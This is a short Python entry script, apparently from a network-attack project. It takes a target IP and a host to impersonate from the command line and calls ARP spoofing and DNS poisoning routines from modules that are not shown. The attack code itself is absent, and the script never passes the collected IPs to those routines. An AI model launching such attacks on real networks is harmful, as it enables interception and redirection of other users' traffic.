import sys
from scapy import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning

if __name__ == "__main__":
    arguments = sys.argv
    ips = []

    for ip in arguments[1:]:
        ips.append(ip)

    print(ips)

    hostToAttack = ips[0]
    hostToSpoof = ips[1]

    arpSpoofing = ArpSpoofing()
    arpSpoof = arpSpoofing.doSpoof()

    dnsPoisoning = DnsPoisoning()
    dnsPoison = dnsPoisoning.doPoison()
